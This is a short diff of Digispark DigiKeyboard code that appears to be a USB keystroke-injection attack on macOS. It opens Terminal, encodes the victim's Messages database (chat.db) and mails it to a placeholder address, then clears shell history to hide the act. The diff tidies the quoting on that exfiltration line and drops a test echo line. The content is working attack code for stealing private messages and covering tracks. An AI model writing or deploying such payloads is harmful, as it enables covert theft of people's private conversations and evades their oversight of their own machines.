@@ -10,14 +10,11 @@ void loop() {
     DigiKeyboard.print("Terminal");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(300);
-    DigiKeyboard.print("uuencode ~/Library/Messages/chat.db chat.db | mail -s "Digispark Report" <email_address>
+    DigiKeyboard.print("uuencode ~/Library/Messages/chat.db chat.db | mail -s 'Digispark Report' <email_address>
     DigiKeyboard.delay(300);
     DigiKeyboard.print("history -c");
     DigiKeyboard.delay(300);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.print("echo 5A13X99");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(1000);
     DigiKeyboard.print("exit");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(250);
